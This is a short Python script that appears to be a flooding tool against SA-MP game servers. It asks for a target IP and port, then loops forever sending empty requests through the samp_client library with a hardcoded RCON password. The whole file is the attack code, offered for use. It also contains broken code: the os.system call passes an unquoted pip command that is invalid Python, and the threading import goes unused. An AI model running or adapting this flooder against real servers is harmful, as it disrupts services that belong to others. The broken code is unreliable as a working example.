from samp_client.client import SampClient
import sys
import threading
import os

os.system(py -m pip install samp-client)

ip = input("IP : ")
udp = input("port : ")

def CUDP(ip, port):
    while True:
        with SampClient(ip, port, rcon_password="jomblo123") as client:
            while True:
                client.send_request(b'')

CUDP(ip, udp)
